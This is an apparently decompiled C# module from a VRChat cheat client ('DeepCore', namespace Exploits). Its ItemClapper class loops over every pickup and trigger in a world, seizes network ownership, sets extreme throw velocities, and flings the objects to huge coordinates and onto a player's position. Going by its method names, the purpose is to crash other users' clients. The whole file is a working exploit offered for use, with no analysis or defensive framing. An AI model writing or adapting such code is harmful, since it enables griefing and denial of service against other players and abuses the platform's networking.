using System;
using System.Collections;
using System.Collections.Generic;
using System.Linq;
using MelonLoader;
using ReMod.Core.VRChat;
using UnityEngine;
using VRC.SDK3.Components;
using VRC.SDKBase;

namespace DeepCore.Client.Module.Exploits
{
	// Token: 0x0200005D RID: 93
	internal class ItemClapper
	{
		// Token: 0x060001EA RID: 490 RVA: 0x0000D551 File Offset: 0x0000B751
		public static void State(bool s)
		{
			if (s)
			{
				ItemClapper.ItemCrashBool = true;
				MelonCoroutines.Start(ItemClapper.ItemCrash(PlayerExtensions.GetVRCPlayer()));
				return;
			}
			ItemClapper.ItemCrashBool = false;
		}

		// Token: 0x060001EB RID: 491 RVA: 0x0000D573 File Offset: 0x0000B773
		public static IEnumerator ItemCrash(VRCPlayer Player)
		{
			while (ItemClapper.ItemCrashBool)
			{
				List<VRC_Pickup> AllPickups = OnLoadedScaneManager.sdk3Items.ToList<VRC_Pickup>();
				List<VRCPickup> AllUdonPickups = OnLoadedScaneManager.sdk3Items.ToList<VRCPickup>();
				List<VRC_Trigger> list = OnLoadedScaneManager.allTriggers.ToList<VRC_Trigger>();
				if (list != null)
				{
					foreach (VRC_Trigger vrc_Trigger in list)
					{
						if (vrc_Trigger.HasPickupTriggers)
						{
							Networking.LocalPlayer.TakeOwnership(vrc_Trigger.gameObject);
							vrc_Trigger.TakesOwnershipIfNecessary.ToString();
							vrc_Trigger.Interact();
						}
					}
				}
				if (AllPickups != null)
				{
					foreach (VRC_Pickup vrc_Pickup in AllPickups)
					{
						Networking.LocalPlayer.TakeOwnership(vrc_Pickup.gameObject);
						vrc_Pickup.pickupable = true;
						vrc_Pickup.ThrowVelocityBoostMinSpeed = 2.1474836E+09f;
						vrc_Pickup.ThrowVelocityBoostScale = 2.1474836E+09f;
						vrc_Pickup.transform.position = new Vector3(2.1474836E+09f, 2.1474836E+09f, 2.1474836E+09f);
					}
					yield return new WaitForSeconds(7f);
					foreach (VRC_Pickup vrc_Pickup2 in AllPickups)
					{
						Networking.LocalPlayer.TakeOwnership(vrc_Pickup2.gameObject);
						vrc_Pickup2.pickupable = true;
						vrc_Pickup2.ThrowVelocityBoostMinSpeed = 2.1474836E+09f;
						vrc_Pickup2.ThrowVelocityBoostScale = 2.1474836E+09f;
						vrc_Pickup2.transform.position = Player.field_Private_VRCPlayerApi_0.GetBonePosition(10);
					}
					yield return new WaitForSeconds(8f);
				}
				else if (AllUdonPickups != null)
				{
					foreach (VRCPickup vrcpickup in AllUdonPickups)
					{
						Networking.LocalPlayer.TakeOwnership(vrcpickup.gameObject);
						vrcpickup.pickupable = true;
						vrcpickup.ThrowVelocityBoostMinSpeed = 2.1474836E+09f;
						vrcpickup.ThrowVelocityBoostScale = 2.1474836E+09f;
						vrcpickup.transform.position = new Vector3(2.1474836E+09f, 2.1474836E+09f, 2.1474836E+09f);
					}
					yield return new WaitForSeconds(7f);
					foreach (VRCPickup vrcpickup2 in AllUdonPickups)
					{
						Networking.LocalPlayer.TakeOwnership(vrcpickup2.gameObject);
						vrcpickup2.pickupable = true;
						vrcpickup2.ThrowVelocityBoostMinSpeed = 2.1474836E+09f;
						vrcpickup2.ThrowVelocityBoostScale = 2.1474836E+09f;
						vrcpickup2.transform.position = Player.field_Private_VRCPlayerApi_0.GetBonePosition(10);
					}
					yield return new WaitForSeconds(8f);
				}
				AllPickups = null;
				AllUdonPickups = null;
				AllPickups = null;
				AllUdonPickups = null;
			}
			yield break;
		}

		// Token: 0x04000108 RID: 264
		public static bool ItemCrashBool;
	}
}
